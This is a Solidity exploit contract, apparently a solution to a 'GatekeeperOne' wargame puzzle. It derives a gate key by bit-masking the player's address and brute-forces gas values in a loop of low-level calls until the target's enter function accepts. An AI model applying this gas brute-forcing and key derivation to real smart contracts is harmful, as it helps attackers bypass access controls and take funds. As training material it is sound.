contract Attacker {

  // Player address: 0x16CE5622a5C99f39a59120131566B047F7E992c7
  // Player address 8bytes: 0x1566B047F7E992c7 (Last 16 digits)

  bytes8 txOrigin16 = 0x1566B047F7E992c7;
  bytes8 gateKey = txOrigin16 & 0xFFFFFFFF0000FFFF; // We mask with AND to get the key.

  GatekeeperOne target;

  constructor (GatekeeperOne _target){
    target = _target;
  }
  
  function attack() public {

    for(uint i; i < 8191; i++){

//iteration + 100(I kept incrementing the number until the number was a good barome), 8191 the module needed, * 3 ensures that I exceeds minimum gas used which is 21K)
      (bool success, bytes memory data) = address(target).call{gas: i + 100 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", gateKey));

      // if the call to the function successes, it will stop the loop.
      if(success){
        break;
      }
    }
  }
}

